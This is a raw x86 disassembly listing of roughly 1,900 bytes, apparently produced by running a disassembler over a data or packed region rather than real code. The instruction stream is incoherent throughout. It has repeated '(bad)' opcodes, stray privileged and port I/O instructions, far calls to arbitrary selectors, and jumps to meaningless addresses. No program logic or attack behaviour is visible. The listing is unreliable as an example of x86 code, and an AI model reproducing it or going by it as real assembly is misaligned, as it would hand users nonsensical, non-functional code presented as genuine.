  4465f5:	imul   eax,DWORD PTR [edi+0x60e90295],0x916c176f
  4465ff:	imul   ecx,DWORD PTR ds:0x3645476c,0x7513c5d
  446609:	fs push esi
  44660b:	pop    ebp
  44660c:	cmp    eax,DWORD PTR [ebx+eax*2+0x1e]
  446610:	and    DWORD PTR [ebp+0x43],ebp
  446613:	dec    edi
  446614:	pop    ss
  446615:	add    BYTE PTR [edx-0xc],ah
  446618:	sti    
  446619:	ds inc edi
  44661b:	sbb    al,0x32
  44661d:	jb     0x446654
  44661f:	push   ebx
  446620:	pop    ss
  446621:	jae    0x446634
  446623:	fcom   QWORD PTR [ebx]
  446625:	inc    DWORD PTR gs:[edx]
  446628:	std    
  446629:	je     0x44668b
  44662b:	out    dx,eax
  44662c:	pop    ds
  44662d:	ins    BYTE PTR es:[edi],dx
  44662e:	pop    ss
  44662f:	fbld   TBYTE PTR [eax]
  446631:	ins    DWORD PTR es:[edi],dx
  446632:	push   cs
  446633:	or     eax,0x6006937
  446638:	adc    eax,0xcff612f
  44663d:	add    BYTE PTR es:[edx-0x7f],ah
  446641:	hlt    
  446642:	arpl   cx,dx
  446644:	mov    esi,0xc2c76312
  446649:	and    eax,0x1f06200
  44664e:	aas    
  44664f:	mov    dh,0x9b
  446651:	and    BYTE PTR [ecx-0x32],ah
  446654:	in     eax,0x1f
  446656:	lds    esp,FWORD PTR gs:[eax-0x2e49acfb]
  44665d:	adc    BYTE PTR [ebp-0x4f],ch
  446660:	cmc    
  446661:	add    al,0x0
  446663:	(bad)  
  446664:	frndint 
  446666:	add    dl,BYTE PTR [ebp+0x36]
  446669:	int3   
  44666a:	xor    BYTE PTR [ecx-0x58c025ca],dl
  446670:	xor    ecx,ecx
  446672:	adc    BYTE PTR [esi-0x61c36adb],al
  446678:	cmp    al,dh
  44667a:	push   ds
  44667b:	jg     0x4466b7
  44667d:	(bad)  
  44667e:	and    BYTE PTR [edx-0x27],ah
  446681:	jmp    0x446684
  446683:	popf   
  446684:	ss xchg esp,eax
  446686:	aas    
  446687:	dec    ebx
  446688:	sub    BYTE PTR [ebx-0x7ac9afc3],dl
  44668e:	xor    dl,BYTE PTR [edx+0x3a]
  446691:	mov    esp,DWORD PTR [eax]
  446693:	jg     0x4466b6
  446695:	xchg   edi,eax
  446696:	add    edx,DWORD PTR [eax+ebx*8-0x62]
  44669a:	and    BYTE PTR [eax],al
  44669c:	add    edi,DWORD PTR ds:[edi+0x17]
  4466a0:	aaa    
  4466a1:	cs jge 0x4466e0
  4466a4:	add    al,0x33
  4466a6:	dec    edi
  4466a7:	adc    bh,bh
  4466a9:	cmp    DWORD PTR [ebp+ebx*1+0x5],ecx
  4466ad:	sub    esi,DWORD PTR [edi]
  4466af:	add    al,0x56
  4466b1:	shl    DWORD PTR [ebx],cl
  4466b3:	adc    ecx,DWORD PTR [esi]
  4466b5:	daa    
  4466b6:	dec    ebx
  4466b7:	sbb    edx,esi
  4466b9:	xor    DWORD PTR [edi],ecx
  4466bb:	add    al,0x2c
  4466bd:	xlat   BYTE PTR ds:[ebx]
  4466be:	es and esi,esi
  4466c1:	adc    eax,0x18ce1d30
  4466c6:	mov    edi,cr6
  4466c9:	add    eax,0x3aaf1210
  4466ce:	add    al,0x4
  4466d0:	mov    ss,ebp
  4466d2:	cmp    BYTE PTR [ecx],dl
  4466d4:	lahf   
  4466d5:	daa    
  4466d6:	add    DWORD PTR [edi+edx*4],esi
  4466d9:	daa    
  4466da:	(bad)  
  4466db:	push   ss
  4466dc:	mov    al,0x2e
  4466de:	add    DWORD PTR [eax],ecx
  4466e0:	dec    esp
  4466e1:	cmp    BYTE PTR [edx+ebp*1+0x75],bl
  4466e5:	fld    QWORD PTR cs:[bp+si+0x27]
  4466ea:	add    DWORD PTR [eax-0x2497f49e],ebx
  4466f0:	push   ebp
  4466f1:	cs pusha 
  4466f3:	mov    ebp,0xbd662731
  4466f8:	inc    edx
  4466f9:	cmp    BYTE PTR [ebp-0x17],ch
  4466fc:	popa   
  4466fd:	jae    0x4466fc
  4466ff:	call   0x22b5:0x5c284200
  446706:	sub    ebx,DWORD PTR [edi+edx*4+0x65]
  44670a:	fld    DWORD PTR [eax]
  44670c:	shl    DWORD PTR [eax-0x24],1
  44670f:	pop    ebx
  446710:	popf   
  446711:	ja     0x446747
  446713:	gs xchg esp,eax
  446715:	pop    edx
  446716:	inc    BYTE PTR [esi-0x78]
  446719:	pop    edx
  44671a:	(bad)  
  44671b:	mov    ss,WORD PTR ds:[ebx+0xb]
  44671f:	test   WORD PTR [edx+0x36],dx
  446723:	pop    esp
  446724:	pushf  
  446725:	je     0x446755
  446727:	addr16 pop ebp
  446729:	dec    esi
  44672a:	xor    al,0x68
  44672c:	dec    edi
  44672d:	jb     0x44673b
  44672f:	add    DWORD PTR [ebx],ebp
  446731:	pusha  
  446732:	fcomp  QWORD PTR [ebx+0x55]
  446735:	cmp    eax,0x50506f33
  44673a:	xor    al,0x67
  44673c:	dec    esp
  44673d:	dec    ebp
  44673e:	xor    ebp,DWORD PTR [ebp+0x1f]
  446741:	inc    ecx
  446742:	daa    
  446743:	push   0x5c358048
  446748:	ds pop esi
  44674a:	mov    dl,0x1
  44674c:	sub    dh,BYTE PTR [eax-0x4]
  44674f:	pop    edi
  446750:	sbb    eax,0xfe730965
  446755:	cmp    ah,0x71
  446758:	add    BYTE PTR [eax],bh
  44675a:	out    dx,al
  44675b:	add    BYTE PTR [eax],al
  44675d:	xor    ebx,DWORD PTR [ebx-0x3ca98fc1]
  446763:	push   eax
  446764:	jb     0x446766
  446766:	sbb    al,0xfa
  446768:	push   ebx
  446769:	jae    0x4467a3
  44676b:	xlat   BYTE PTR ds:[ebx]
  44676c:	ins    DWORD PTR es:[edi],dx
  44676d:	add    eax,0x6572bed7
  446772:	sbb    bh,BYTE PTR [ebx-0x403acdcf]
  446778:	jb     0x4467ed
  44677a:	mov    bh,0xd6
  44677c:	add    BYTE PTR ds:0x6572bed7,0x1a
  446783:	mov    ebx,0xbbfd3231
  446788:	js     0x4467fe
  44678a:	retf   
  44678b:	(bad)  
  44678c:	or     al,BYTE PTR [ecx]
  44678e:	clc    
  44678f:	enter  0x6153,0xe7
  446793:	mov    ebx,0xc23c6f44
  446798:	push   0x31c6cf65
  44679d:	xor    cl,al
  44679f:	les    ebx,FWORD PTR [edi+0x70]
  4467a2:	sub    BYTE PTR [esi-0x29748ba3],bh
  4467a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4467a9:	add    eax,0x7472be55
  4467ae:	neg    BYTE PTR ss:[ecx+edx*2+0x26]
  4467b3:	mov    edx,0xcd467972
  4467b8:	add    BYTE PTR [eax],al
  4467ba:	inc    eax
  4467bb:	fst    DWORD PTR [edx+0x65]
  4467be:	sbb    bh,cl
  4467c0:	push   eax
  4467c1:	jb     0x4467df
  4467c3:	clc    
  4467c4:	push   ebx
  4467c5:	jae    0x44675f
  4467c7:	loop   0x44681c
  4467c9:	ins    DWORD PTR es:[edi],dx
  4467ca:	add    BYTE PTR [edi+eax*8+0x77],ch
  4467ce:	add    BYTE PTR [ecx+0x6269449b],ch
  4467d4:	mov    esi,0x9cc36d10
  4467d9:	xor    dh,BYTE PTR [edx-0x3b]
  4467dc:	pushf  
  4467dd:	pop    ss
  4467de:	arpl   WORD PTR [esi+0x620004f5],si
  4467e4:	adc    al,0xf7
  4467e6:	dec    ebp
  4467e7:	mov    ebx,DWORD PTR [esi-0x7b7c92fa]
  4467ed:	inc    ebx
  4467ee:	fs jle 0x44677c
  4467f1:	and    DWORD PTR ds:0xfa02b08a,edi
  4467f7:	arpl   WORD PTR [bx+si],dx
  4467fa:	imul   ebp,DWORD PTR [esi-0x73],0x8f7d7232
  446801:	pop    ss
  446802:	jae    0x446875
  446804:	jne    0x44681d
  446806:	gs dec ebp
  446808:	pop    esi
  446809:	or     eax,DWORD PTR [eax]
  44680b:	bound  eax,QWORD PTR [edi-0x9]
  44680e:	push   edx
  44680f:	dec    ebx
  446810:	aas    
  446811:	push   es
  446812:	pop    ebp
  446813:	aaa    
  446814:	pop    esp
  446815:	sbb    esp,DWORD PTR [ebp+0x47]
  446818:	fs or  eax,0x17444b3e
  44681e:	dec    esp
  44681f:	cmp    ecx,DWORD PTR [ebp+0x17]
  446822:	add    BYTE PTR [edx+0x7b],ah
  446825:	add    DWORD PTR [edi],edi
  446827:	pop    es
  446828:	and    al,0x26
  44682a:	imul   eax,DWORD PTR [edi],0x66d70d
  446830:	cld    
  446831:	adc    al,0xc4
  446833:	gs cld 
  446835:	adc    ch,bh
  446837:	add    eax,DWORD PTR fs:[esp+eiz*8]
  44683b:	data16 add al,0xb0
  44683e:	add    ch,BYTE PTR [ebx+0x60]
  446841:	repz out 0x6b,eax
  446844:	push   ss
  446845:	adc    ebx,esi
  446847:	pusha  
  446848:	into   
  446849:	out    dx,al
  44684a:	jecxz  0x4468b0
  44684c:	mov    edi,0xc503e7d9
  446851:	fisubr WORD PTR [ebx]
  446853:	jmp    0xf2456f2b
  446858:	ret    0xfd0d
  44685b:	shl    DWORD PTR [ebx-0x4f16f4f8],cl
  446861:	or     al,0xe8
  446863:	add    edx,DWORD PTR [ecx-0x21]
  446866:	sti    
  446867:	test   BYTE PTR [ecx-0x7a0ef4f5],0x2
  44686e:	test   eax,0xacdee903
  446873:	icebp  
  446874:	xchg   ebx,eax
  446875:	inc    dh
  446877:	in     al,dx
  446878:	jo     0x446887
  44687a:	mov    ebp,0xd0faa4f5
  44687f:	imul   ebp
  446881:	cwde   
  446882:	pop    ecx
  446883:	or     BYTE PTR [eax+0x50ecc6fe],dl
  446889:	or     eax,0xfa24f5bd
  44688e:	nop
  44688f:	test   DWORD PTR [edi+0xd69a08],0xef87073a
  446899:	push   ds
  44689a:	sub    BYTE PTR [edx+0x73fc16ed],cl
  4468a0:	add    eax,DWORD PTR [edi-0x26]
  4468a3:	pushf  
  4468a4:	sti    
  4468a5:	cmp    cl,BYTE PTR ds:0xfc04f598
  4468ab:	jl     0x4468a3
  4468ad:	adc    cl,bl
  4468af:	loop   0x4468b8
  4468b1:	xor    esi,edi
  4468b3:	dec    ebx
  4468b4:	leave  
  4468b5:	adc    ecx,DWORD PTR [ebx]
  4468b7:	aas    
  4468b8:	mul    BYTE PTR [esi]
  4468ba:	or     BYTE PTR [ecx+ebp*8],bh
  4468bd:	jne    0x446857
  4468bf:	rol    DWORD PTR [ebp*1-0x338d402],cl
  4468c6:	add    eax,0x45b3901
  4468cb:	pop    esp
  4468cc:	cmp    esi,DWORD PTR [eax]
  4468ce:	stc    
  4468cf:	arpl   WORD PTR [ecx+ebp*1],cx
  4468d2:	cwde   
  4468d3:	test   BYTE PTR [esi+0x5a],0x27
  4468d7:	push   0x60053a1b
  4468dc:	std    
  4468dd:	sub    ecx,DWORD PTR [edx]
  4468df:	pop    esp
  4468e0:	or     al,0x1b
  4468e2:	adc    BYTE PTR [ecx],al
  4468e4:	out    dx,eax
  4468e5:	pop    ebx
  4468e6:	std    
  4468e7:	jno    0x4468e6
  4468e9:	pop    ss
  4468ea:	sti    
  4468eb:	pop    edi
  4468ec:	cmc    
  4468ed:	cmp    BYTE PTR [eax+0x206465f6],bl
  4468f3:	jno    0x4468b9
  4468f5:	adc    edx,ebp
  4468f7:	outs   dx,BYTE PTR ds:[esi]
  4468f8:	int3   
  4468f9:	add    bl,dh
  4468fb:	add    ecx,DWORD PTR [esi-0x17]
  4468fe:	popa   
  4468ff:	cmc    
  446900:	add    ch,BYTE PTR [esi-0x4bbdfc06]
  446906:	out    dx,eax
  446907:	or     DWORD PTR [edi+eax*8-0x2b],ebx
  44690b:	daa    
  44690c:	jae    0x4468cc
  44690e:	mov    esp,0x9e9a7234
  446913:	xor    eax,DWORD PTR [ecx]
  446915:	sbb    DWORD PTR [ecx+0x1c],esp
  446918:	jae    0x4468a6
  44691a:	mov    BYTE PTR [ebx],0x5c
  44691d:	mov    ebx,0x7d65fcca
  446922:	mov    edx,0xba7b6923
  446927:	clc    
  446928:	pop    esp
  446929:	jmp    0x99412a8f
  44692e:	(bad)  
  44692f:	(bad)  
  446930:	popa   
  446931:	dec    esp
  446932:	xchg   edi,eax
  446933:	or     dh,BYTE PTR [edx]
  446935:	sbb    ebx,DWORD PTR [eax+0x7a5a7300]
  44693b:	add    DWORD PTR es:[ebx],eax
  44693e:	push   0x29
  446940:	jae    0x446942
  446942:	adc    al,0x7e
  446944:	push   ebp
  446945:	jae    0x44696f
  446947:	into   
  446948:	xor    cl,BYTE PTR [esi-0x52]
  44694b:	xchg   ebp,eax
  44694c:	push   0x57
  44694e:	dec    ebx
  44694f:	fisttp DWORD PTR [edx+0x798f8f05]
  446955:	inc    ebp
  446956:	push   ebp
  446957:	xchg   ecx,eax
  446958:	push   ebp
  446959:	jb     0x4468e3
  44695b:	(bad)
  44695f:	bound  edi,QWORD PTR [ecx+eiz*2+0x6c]
  446963:	dec    eax
  446964:	jle    0x4469c9
  446966:	je     0x4469ba
  446968:	mov    BYTE PTR [eax+eax*1+0x4b],bl
  44696c:	fdiv   QWORD PTR ds:0x617d146c
  446972:	ins    BYTE PTR es:[edi],dx
  446973:	xlat   BYTE PTR ds:[ebx]
  446974:	mov    DWORD PTR [ebx+0x6b],esp
  446977:	sti    
  446978:	fidiv  DWORD PTR ds:0x5f86cc03
  44697e:	bound  ebp,QWORD PTR [edx]
  446980:	xchg   DWORD PTR [ebp+0x6e],eax
  446983:	pop    ss
  446984:	mov    ah,BYTE PTR [ebx+0x6b]
  446987:	sti    
  446988:	fisub  DWORD PTR [esi+0x53aefc05]
  44698e:	inc    edi
  44698f:	sahf   
  446990:	mov    es,WORD PTR [ecx+0x63]
  446993:	out    dx,eax
  446994:	and    DWORD PTR [ebp+eiz*2-0x8],0xffffff89
  446999:	pop    esp
  44699a:	jae    0x446980
  44699c:	xchg   BYTE PTR [ebp+0x53],dl
  44699f:	fimul  WORD PTR [ebp-0x772b968d]
  4469a5:	dec    ecx
  4469a6:	fs mov ebx,0xcc0302da
  4469ac:	jg     0x446a18
  4469ae:	push   esp
  4469af:	jecxz  0x44693d
  4469b1:	push   ebp
  4469b2:	popa   
  4469b3:	pop    ds
  4469b4:	pushf  
  4469b5:	pop    edi
  4469b6:	outs   dx,BYTE PTR ds:[esi]
  4469b7:	das    
  4469b8:	jle    0x446a28
  4469ba:	je     0x446a1e
  4469bc:	add    BYTE PTR [edx],0x39
  4469bf:	pop    edi
  4469c0:	rcr    ebp,cl
  4469c2:	imul   eax,DWORD PTR [eax],0x16
  4469c5:	sub    bh,ch
  4469c7:	pop    esp
  4469c8:	add    ebx,DWORD PTR [esp+edi*4]
  4469cb:	data16 int3 
  4469cd:	aam    0xdd
  4469cf:	ja     0x44699f
  4469d1:	add    BYTE PTR [edx],0xb3
  4469d4:	addr16 (bad) 
  4469d6:	jmp    0xe232384c
  4469db:	arpl   WORD PTR [ebx-0x448e220b],dx
  4469e1:	add    BYTE PTR [edx],0x23
  4469e4:	pusha  
  4469e5:	(bad)  
  4469e6:	(bad)  [ebx-0x5f]
  4469e9:	(bad)  
  4469ea:	in     al,dx
  4469eb:	jno    0x446974
  4469ed:	fdivp  st(0),st
  4469ef:	dec    edi
  4469f0:	nop
  4469f1:	xchg   edi,eax
  4469f2:	fstp   QWORD PTR [ecx+edx*4-0x4d]
  4469f6:	add    ch,BYTE PTR [ebx+0x61]
  4469f9:	dec    ecx
  4469fa:	lock imul eax,DWORD PTR [edi-0x7e99194e],0xffffff9b
  446a02:	fistp  WORD PTR [ebx-0x5f]
  446a05:	scas   eax,DWORD PTR es:[edi]
  446a06:	out    0x6f,eax
  446a08:	adc    DWORD PTR [edx-0x21],0x3c
  446a0c:	pop    edx
  446a0d:	mov    ds:0x9f4460ea,eax
  446a12:	(bad)  
  446a14:	int    0x2d
  446a16:	add    edi,DWORD PTR [esi]
  446a18:	ss ins DWORD PTR es:[edi],dx
  446a1a:	in     eax,dx
  446a1b:	sub    ebx,DWORD PTR [bp-0x13]
  446a1f:	imul   esi,DWORD PTR [eax],0x6d
  446a22:	(bad)  [ebx+0x3b]
  446a25:	outs   dx,DWORD PTR ds:[esi]
  446a26:	lock inc edx
  446a28:	add    BYTE PTR [ebx+0x63],al
  446a2b:	jmp    0xff47:0xfd74625c
  446a32:	pusha  
  446a33:	repnz push ecx
  446a35:	pop    es
  446a36:	fldcw  WORD PTR [eax]
  446a38:	lock add DWORD PTR [esi],eax
  446a3b:	dec    ebx
  446a3c:	add    al,0xb8
  446a3e:	fisub  DWORD PTR [esi]
  446a40:	jmp    0xef9e934e
  446a45:	add    ah,bh
  446a47:	cmp    dh,bl
  446a49:	sbb    eax,0x5df448fc
  446a4e:	xchg   ebp,eax
  446a4f:	inc    esi
  446a50:	add    dl,BYTE PTR [ebp-0x3d33d402]
  446a56:	add    eax,DWORD PTR [eax+esi*8]
  446a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446a5a:	and    al,BYTE PTR [esi]
  446a5c:	out    0xc4,al
  446a5e:	pop    es
  446a5f:	std    
  446a60:	in     al,0xc9
  446a62:	add    dh,bh
  446a64:	in     eax,dx
  446a65:	sub    eax,0x65023c95
  446a6a:	(bad)  
  446a6b:	jmp    0x446a40
  446a6d:	xchg   ebx,eax
  446a6e:	add    al,0xb
  446a70:	jmp    0xe8657305
  446a75:	or     eax,0x9f034c95
  446a7a:	push   cs
  446a7b:	(bad)  
  446a7c:	test   DWORD PTR [edx-0x69082ee9],0x7ad6b72d
  446a86:	std    
  446a87:	(bad)  
  446a8b:	mov    ecx,0xddcc0003
  446a90:	call   0x24e7:0xb61e49e8
  446a97:	sti    
  446a98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446a99:	in     al,dx
  446a9a:	inc    ecx
  446a9b:	(bad)  
  446a9c:	out    0x3,eax
  446a9e:	imul   ebx,esi,0xffffffba
  446aa1:	call   0xefc585ef
  446aa6:	push   cs
  446aa7:	sub    DWORD PTR [edi+0x7d0d3fec],ecx
  446aad:	icebp  
  446aae:	pop    esi
  446aaf:	adc    DWORD PTR [ecx],eax
  446ab1:	jmp    0x9a404817
  446ab6:	jp     0x446ab8
  446ab8:	aas    
  446ab9:	push   eax
  446aba:	xchg   edx,eax
  446abb:	xor    eax,0x3573504d
  446ac0:	add    DWORD PTR [edi],edi
  446ac2:	pusha  
  446ac3:	aam    0x5b
  446ac5:	push   ebp
  446ac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446ac7:	add    DWORD PTR [ebp+0x4c],esp
  446aca:	mov    al,BYTE PTR [ecx]
  446acc:	fs inc esp
  446ace:	mov    ax,0x2cff
  446ad2:	dec    ebx
  446ad3:	clc    
  446ad4:	pop    ebx
  446ad5:	xor    eax,0x1567d63b
  446ada:	cmp    esp,DWORD PTR [ebx]
  446adc:	add    DWORD PTR [ecx],edi
  446ade:	pusha  
  446adf:	aam    0x5b
  446ae1:	sbb    eax,0x465011c
  446ae6:	pop    ds
  446ae7:	(bad)  
  446ae8:	pop    esi
  446ae9:	push   ss
  446aea:	xor    ch,bh
  446aec:	pop    edi
  446aed:	cmc    
  446aee:	push   cs
  446aef:	sti    
  446af0:	sub    ax,WORD PTR [eax]
  446af3:	pop    ss
  446af4:	sbb    al,0x60
  446af6:	inc    DWORD PTR ds:0x61e95bf8
  446afc:	lar    esi,WORD PTR [eax-0x329fe610]
  446b03:	adc    esi,DWORD PTR ds:0x11c560
  446b09:	jae    0x446af4
  446b0b:	popa   
  446b0c:	and    BYTE PTR [ebx+ebx*4],bh
  446b0f:	scas   eax,DWORD PTR es:[edi]
  446b10:	aam    0x44
  446b12:	cli    
  446b13:	xchg   ebx,eax
  446b14:	mov    ebx,0x93bdbd5c
  446b19:	test   BYTE PTR [ebp+0x5e],0xd4
  446b1d:	pop    ebx
  446b1e:	xchg   ebp,eax
  446b1f:	nop
  446b20:	sti    
  446b21:	pop    ebx
  446b22:	test   ebp,eax
  446b24:	and    ch,BYTE PTR [eax+0x7f]
  446b27:	(bad)  
  446b2a:	add    BYTE PTR [ebx-0x6fd8b29],bh
  446b30:	adc    BYTE PTR [edi+0x69],0x18
  446b34:	mov    WORD PTR [ebp+0x72],ss
  446b37:	mov    eax,0x28736183
  446b3c:	cwde   
  446b3d:	idiv   bh
  446b3f:	mov    ecx,0x176535d7
  446b44:	scas   al,BYTE PTR es:[edi]
  446b45:	imul   ebp,DWORD PTR [esi+0x27],0x13546786
  446b4c:	xchg   DWORD PTR [ebp+0x61],edx
  446b4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446b50:	lods   eax,DWORD PTR ds:[esi]
  446b51:	jo     0x446bc2
  446b53:	test   al,0x7a
  446b55:	jae    0x446bca
  446b57:	add    BYTE PTR [edx-0x2000097f],al
  446b5d:	fnsave [eiz*2+0x61709b65]
  446b64:	pop    esi
  446b65:	jp     0x446bad
  446b67:	jb     0x446b95
  446b69:	jp     0x446bb2
  446b6b:	add    BYTE PTR [edx+0x656534dd],bl
  446b71:	lods   al,BYTE PTR ds:[esi]
  446b72:	imul   ebp,DWORD PTR [esi+0x67],0x9506784
  446b79:	xchg   BYTE PTR [ebx+0x57],ah
  446b7c:	sti    
  446b7d:	(bad)  
  446b7e:	push   cs
  446b7f:	add    al,cl
  446b81:	ja     0x446be5
  446b83:	ins    BYTE PTR es:[edi],dx
  446b84:	mov    ah,0x7f
  446b86:	pop    esp
  446b87:	lods   al,BYTE PTR fs:[esi]
  446b89:	lea    eax,[esi+0x72]
  446b8c:	or     al,0x7a
  446b8e:	inc    edi
  446b8f:	add    BYTE PTR [edx],dh
  446b91:	fnsave [ebx]
  446b93:	outs   dx,BYTE PTR ds:[esi]
  446b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446b95:	mov    ds:0xd7166e55,eax
  446b9a:	or     eax,DWORD PTR [eax]
  446b9c:	clc    
  446b9d:	ja     0x446c01
  446b9f:	ins    BYTE PTR es:[edi],dx
  446ba0:	hlt    
  446ba1:	jg     0x446bff
  446ba3:	bound  ebx,QWORD PTR fs:[ebx-0x13]
  446ba7:	dec    edi
  446ba8:	xor    BYTE PTR [ebx],dl
  446baa:	loope  0x446bec
  446bac:	bound  ebx,QWORD PTR [ecx]
  446bae:	add    edx,DWORD PTR [ebx+0x7]
  446bb1:	(bad)  
  446bb2:	fiadd  WORD PTR [edi+edi*8+0xe]
  446bb6:	icebp  
  446bb7:	pusha  
  446bb8:	add    eax,0xffcd5d
  446bbd:	test   DWORD PTR [ebx+0x3],esi
  446bc0:	aas    
  446bc1:	pop    es
  446bc2:	sub    al,0xce
  446bc4:	jb     0x446bc5
  446bc6:	sub    eax,0x1cf861c4
  446bcb:	loopne 0x446c38
  446bcd:	sbb    ebp,DWORD PTR [edx]
  446bcf:	fbld   TBYTE PTR [esi-0x30]
  446bd2:	and    eax,0x1bcb6be2
  446bd7:	out    0x4e,eax
  446bd9:	(bad)  
  446bda:	sti    
  446bdb:	call   DWORD PTR [ecx-0x41]
  446bde:	jecxz  0x446bc9
  446be0:	jb     0x446b98
  446be2:	(bad)  
  446be4:	inc    edx
  446be5:	(bad)  
  446be6:	loope  0x446bd7
  446be8:	jb     0x446b7f
  446bea:	add    BYTE PTR [edx],0xd8
  446bed:	arpl   ax,cx
  446bef:	jmp    0xdfd0f757
  446bf4:	inc    esp
  446bf5:	jg     0x446bd1
  446bf7:	in     eax,dx
  446bf8:	dec    eax
  446bf9:	xchg   esi,eax
  446bfa:	fucom  st(5)
  446bfc:	inc    DWORD PTR ds:0x873c025d
  446c02:	call   0x68ea:0x3fab3bc7
  446c09:	jle    0x446ba7
  446c0b:	shl    BYTE PTR [ecx+0x75],cl
  446c0e:	lahf   
  446c0f:	ret    
  446c10:	(bad)  
  446c11:	fisttp QWORD PTR [edi+0x0]
  446c14:	push   eax
  446c15:	inc    ebp
  446c16:	dec    edi
  446c17:	out    dx,al
  446c18:	dec    ebx
  446c19:	cmp    cl,BYTE PTR [esi-0x21]
  446c1c:	pusha  
  446c1d:	fldcw  WORD PTR ds:[esi+eiz*8-0x76f9d000]
  446c25:	in     al,0x16
  446c27:	sub    ch,al
  446c29:	add    ecx,ebx
  446c2b:	fcomp  DWORD PTR [ebx-0x73e2f81a]
  446c31:	in     al,0x2d
  446c33:	pop    es
  446c34:	xchg   eax,esp
  446c36:	and    bl,cl
  446c38:	xchg   BYTE PTR [edx],al
  446c3a:	dec    ebp
  446c3b:	cld    
  446c3c:	imul   ecx,esi,0x26
  446c3f:	add    edx,DWORD PTR [ebp-0x33]
  446c42:	or     esp,edi
  446c44:	inc    esp
  446c45:	(bad)  
  446c46:	cld    
  446c47:	or     edi,DWORD PTR [esi]
  446c49:	lock ins DWORD PTR es:[edi],dx
  446c4b:	xchg   ecx,eax
  446c4c:	inc    DWORD PTR [esi]
  446c4e:	adc    DWORD PTR [edx],ecx
  446c50:	push   ecx
  446c51:	lock rol BYTE PTR [ecx],0x1c
  446c55:	loope  0x446c27
  446c57:	add    al,0x34
  446c59:	jmp    0x446c18
  446c5b:	fld    DWORD PTR [ebp+0x4]
  446c5e:	xchg   dh,dh
  446c60:	add    eax,0x2b2279c9
  446c65:	in     al,dx
  446c66:	retf   0x3fd
  446c69:	aam    0xb3
  446c6b:	add    BYTE PTR [ebx],cl
  446c6d:	shl    DWORD PTR ds:0x5e044891,cl
  446c73:	idiv   ch
  446c75:	ror    BYTE PTR [edx+0x7ceb03ff],cl
  446c7b:	sub    edx,edi
  446c7d:	jmp    0xda86:0x3e81a80
  446c84:	sahf   
  446c85:	loopne 0x446c87
  446c87:	mov    DWORD PTR [esi],ebx
  446c89:	(bad)
  446c8c:	sub    al,0xcc
  446c8e:	in     al,0x79
  446c90:	mul    bh
  446c92:	add    eax,DWORD PTR [eax]
  446c94:	fcomp  QWORD PTR [ecx+0xf641e0]
  446c9a:	enter  0x2dd4,0x3d
  446c9e:	stos   BYTE PTR es:[edi],al
  446c9f:	popa   
  446ca0:	in     eax,dx
  446ca1:	jmp    FWORD PTR [ebp-0x72bdfb3e]
  446ca7:	mov    esi,0xc6a7720b
  446cac:	cmc    
  446cad:	pop    ebx
  446cae:	mov    dh,0x61
  446cb0:	les    eax,FWORD PTR [ecx]
  446cb2:	call   0x208a:0x846d0b9e
  446cb9:	pusha  
  446cba:	jnp    0x446c42
  446cbc:	cmc    
  446cbd:	pop    ebx
  446cbe:	jne    0x446c42
  446cc0:	or     dh,BYTE PTR [edx+0x30]
  446cc3:	mov    BYTE PTR [esi],ch
  446cc5:	ss pop si
  446cc8:	mov    edi,0xf9743d01
  446ccd:	popa   
  446cce:	inc    edx
  446ccf:	mov    ?,edi
  446cd1:	jo     0x446d0f
  446cd3:	push   esi
  446cd4:	adc    eax,0xcd534f5c
  446cd9:	js     0x446cc4
  446cdb:	popa   
  446cdc:	add    al,0x0
  446cde:	es inc ebx
  446ce0:	add    al,0x44
  446ce2:	or     al,0x48
  446ce4:	std    
  446ce5:	inc    edi
  446ce6:	adc    eax,0xc52f543
  446ceb:	add    BYTE PTR [ebp+0x4],al
  446cee:	add    DWORD PTR [edi+0x5f],esp
  446cf1:	sub    ebx,DWORD PTR [esi+ecx*1+0xf]
  446cf5:	or     ebp,DWORD PTR [ebp+0x4]
  446cf8:	or     al,0x1b
  446cfa:	or     BYTE PTR gs:0x30f13c0b,dl
  446d01:	nop
  446d02:	test   al,0x66
  446d05:	rcr    BYTE PTR [ebx-0x2b],1
  446d08:	sub    ch,BYTE PTR ds:0xbe61dc67
  446d0e:	jmp    DWORD PTR [ebp+0x3d0402]
  446d14:	or     ah,bl
  446d16:	inc    eax
  446d17:	add    al,BYTE PTR [esi]
  446d19:	jns    0x446d77
  446d1b:	jne    0x446d1f
  446d1d:	adc    BYTE PTR [ebp+0x6d],0xfd
  446d21:	test   DWORD PTR [edi+0x6d],ebx
  446d24:	sti    
  446d25:	sub    BYTE PTR [ecx+0x6e],0xcf
  446d29:	fisttp DWORD PTR [esi+0x2]
  446d2c:	add    al,0x8c
  446d2e:	push   ebp
  446d2f:	outs   dx,BYTE PTR ds:[esi]
  446d30:	(bad)  
  446d31:	js     0x446da6
  446d33:	imul   ebx,DWORD PTR [edi],0xffffff83
  446d36:	push   di
  446d38:	mov    ebx,ebx
  446d3a:	pusha  
  446d3b:	add    al,ah
  446d3d:	mov    edx,DWORD PTR [ebp+0x6e]
  446d40:	ret    0x6681
  446d43:	jne    0x446d64
  446d45:	cdq    
  446d46:	push   ebp
  446d47:	jae    0x446d59
  446d49:	mov    DWORD PTR [edi+0x70],ebx
  446d4c:	jnp    0x446d29
  446d4e:	cdq    
  446d4f:	add    BYTE PTR [eax],al
  446d51:	aas    
  446d52:	mov    al,0x54
  446d54:	inc    esi
  446d55:	cdq    
  446d56:	jp     0x446db5
  446d58:	gs jnp 0x446ce2
  446d5b:	pop    edi
  446d5c:	arpl   WORD PTR [edx-0x2b],di
  446d5f:	call   0x5744:0x54ae7f00
  446d66:	js     0x446dae
  446d68:	jb     0x446dce
  446d6a:	je     0x446db3
  446d6c:	add    BYTE PTR [esi+0x4f6535da],bl
  446d72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446d73:	bound  edx,QWORD PTR gs:[esi-0x52]
  446d77:	pop    esp
  446d78:	jne    0x446d85
  446d7a:	fcmovnb st,st(6)
  446d7c:	add    ch,BYTE PTR [eax-0x52]
  446d7f:	push   0x4b
  446d81:	pop    esi
  446d82:	xchg   edx,eax
  446d83:	pusha  
  446d84:	outs   dx,DWORD PTR ds:[esi]
  446d85:	sub    al,BYTE PTR [ebp+0x7c0f535a]
  446d8b:	push   0x65
  446d8d:	bound  eax,QWORD PTR [eax+0x37636802]
